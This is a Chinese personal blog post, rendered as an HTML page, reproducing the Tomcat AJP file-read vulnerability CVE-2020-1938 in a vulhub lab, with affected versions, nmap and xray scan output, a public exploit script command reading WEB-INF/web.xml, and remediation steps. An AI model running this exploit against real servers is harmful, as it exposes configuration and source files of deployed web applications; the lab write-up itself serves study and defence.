@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞0x00漏洞简述攻击者可以利用该漏洞读取部署在Tomcat上的所有web应用的配置文件和源代码文件的内容。如果用户可以上传文件，可以进一步实现LFI。 0x01适用版本Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2020-1938--tomcat-复现">
+<meta property="og:url" content="http://example.com/undefined/9de11cd7.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞0x00漏洞简述攻击者可以利用该漏洞读取部署在Tomcat上的所有web应用的配置文件和源代码文件的内容。如果用户可以上传文件，可以进一步实现LFI。 0x01适用版本Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-06T14:32:08.000Z">
+<meta property="article:modified_time" content="2023-04-09T02:44:08.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="漏洞复现-中间件">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/undefined/9de11cd7.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CVE-2020-1938--tomcat-复现 | So1Lupus</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">So1Lupus</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">So1Lupus</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/9de11cd7.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2020-1938--tomcat-复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-06 22:32:08" itemprop="dateCreated datePublished" datetime="2023-04-06T22:32:08+08:00">2023-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-09 10:44:08" itemprop="dateModified" datetime="2023-04-09T10:44:08+08:00">2023-04-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞"><a href="#CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞" class="headerlink" title="CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞"></a>CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞</h1><h2 id="0x00漏洞简述"><a href="#0x00漏洞简述" class="headerlink" title="0x00漏洞简述"></a>0x00漏洞简述</h2><p>攻击者可以利用该漏洞读取部署在Tomcat上的所有web应用的配置文件和源代码文件的内容。如果用户可以上传文件，可以进一步实现LFI。</p>
+<h2 id="0x01适用版本"><a href="#0x01适用版本" class="headerlink" title="0x01适用版本"></a>0x01适用版本</h2><p>Apache Tomcat 9.x &lt; 9.0.31</p>
+<p>Apache Tomcat 8.x &lt; 8.5.51</p>
+<p>Apache Tomcat 7.x &lt; 7.0.100</p>
+<p>Apache Tomcat 6.0</p>
+<h2 id="0x02利用条件"><a href="#0x02利用条件" class="headerlink" title="0x02利用条件"></a>0x02利用条件</h2><blockquote>
+<p>AJP服务默认开启，默认端口8009</p>
+</blockquote>
+<p>开启AJP服务，并且攻击者可以访问服务端口。</p>
+<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>复现环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938</a></p>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p>
+<p>​		  <a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
+<h3 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h3><p>发现两个端口，8009AJP服务，8080 tomcat 9.0.30</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 22:22 CST</span><br><span class="line">Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 0.00% done</span><br><span class="line">Nmap scan report for 172.21.0.2</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.30</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-漏洞探测"><a href="#2-漏洞探测" class="headerlink" title="2.漏洞探测"></a>2.漏洞探测</h3><p>利用xray，验证存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./xray servicescan --target 172.21.0.2:8009</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [default:dispatcher.go:444] processing 172.21.0.2:8009</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [go-poc:tomcat-cve-2020-1938.go:339] ajp protocol found in 172.21.0.2:8009, status code 404</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [go-poc:tomcat-cve-2020-1938.go:199] found tomcat version 9.0.30</span><br><span class="line">[Vuln: phantasm]</span><br><span class="line">Target           &quot;172.21.0.2:8009&quot;                                                                                                                                                                                                        </span><br><span class="line">VulnType         &quot;poc-go-tomcat-cve-2020-1938/default&quot;                                                                                                                                                                                    </span><br><span class="line">method           &quot;version_match&quot;                                                                                                                                                                                                          </span><br><span class="line">read_file        &quot;/kqhymw.jsp&quot;                                                                                                                                                                                                            </span><br><span class="line">status_code      &quot;404&quot;                                                                                                                                                                                                                    </span><br><span class="line">body             &quot;\\x02\\xd3\\x03\\x02\\xcf&lt;!doctype html&gt;&lt;html lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 – Not Found&lt;/title&gt;&lt;style type=\&quot;text/css\&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 – Not Found&lt;/h1&gt;&lt;hr class=\&quot;line\&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; &amp;#47;kqhymw.jsp&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&lt;/p&gt;&lt;hr class=\&quot;line\&quot; /&gt;&lt;h3&gt;Apache Tomcat/9.0.30&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\\x00AB&quot;                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                                          </span><br><span class="line">[INFO] 2023-04-06 22:24:55 [controller:dispatcher.go:553] wait for reverse server finished</span><br><span class="line">[*] All pending requests have been scanned</span><br><span class="line">[*] scanned: 1, pending: 0, requestSent: 0, latency: 0.00ms, failedRatio: 0.00%</span><br><span class="line">[INFO] 2023-04-06 22:24:58 [controller:dispatcher.go:573] controller released, task done</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>利用现成exploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 172.21.0.2</span><br><span class="line">Getting resource at ajp13://172.21.0.2:8009/asdf</span><br><span class="line">----------------------------</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work for additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing, software</span><br><span class="line">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License for the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span><br><span class="line">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">  version=&quot;4.0&quot;</span><br><span class="line">  metadata-complete=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span><br><span class="line">  &lt;description&gt;</span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  &lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><ol>
+<li>更新版本</li>
+</ol>
+<p>更新版本到9.0.31、8.5.51、7.0.100</p>
+<ol start="2">
+<li><p>未使用ajp服务</p>
+<p>注释  编辑<CATALINA_BASE>&#x2F;conf&#x2F;server.xml，找到如下一行（<CATALINA_BASE>为Tomcat工作目录）：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; </span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>使用ajp服务</li>
+</ol>
+<p>​	升级到新版本后增加secret属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;  protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;  secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; </span><br></pre></td></tr></table></figure>
+
+<p>​	未升级，增加requiresecret属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;  protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;  requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; </span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag"># 漏洞复现-中间件</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/6c59522f.html" rel="prev" title="CVE-2023-21839--Weblogic-复现">
+      <i class="fa fa-chevron-left"></i> CVE-2023-21839--Weblogic-复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/undefined/c1903ce6.html" rel="next" title="CVE-2017-12615--tomcat-复现">
+      CVE-2017-12615--tomcat-复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-1938-Tomcat-ajp%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-x2F-%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">0x00漏洞简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC"><span class="nav-number">1.2.</span> <span class="nav-text">0x01适用版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">0x02利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.4.</span> <span class="nav-text">0x03漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.漏洞探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.3.</span> <span class="nav-text">3.漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.5.</span> <span class="nav-text">0x04漏洞修复</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">So1Lupus</p>
+  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022029346号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
